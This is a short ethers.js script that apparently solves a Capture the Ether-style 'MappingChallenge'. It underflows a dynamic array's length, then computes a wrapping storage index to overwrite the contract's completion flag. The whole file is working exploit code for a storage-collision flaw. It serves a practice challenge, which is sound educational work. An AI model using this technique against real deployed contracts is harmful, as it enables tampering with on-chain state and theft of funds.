async function main() {
    Challenge = await ethers.getContractFactory('MappingChallenge');
    challenge = await Challenge.deploy();
    await challenge.deployed();
    // challenge = await Challenge.attach('0x8AE88F0C25edB6bF850fE920188aA5AD0cA835b4');

    tx = await challenge.set(ethers.BigNumber.from('2').pow('256').sub(2), 1);
    await tx.wait();
    index = ethers.BigNumber.from('2').pow('256').sub(ethers.utils.solidityKeccak256(['uint'], [1]));
    console.log(index.toString());
    tx = await challenge.set(index, 1);
    await tx.wait();
    console.log(await challenge.isComplete());

    
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error.message);
      process.exit(1);
  })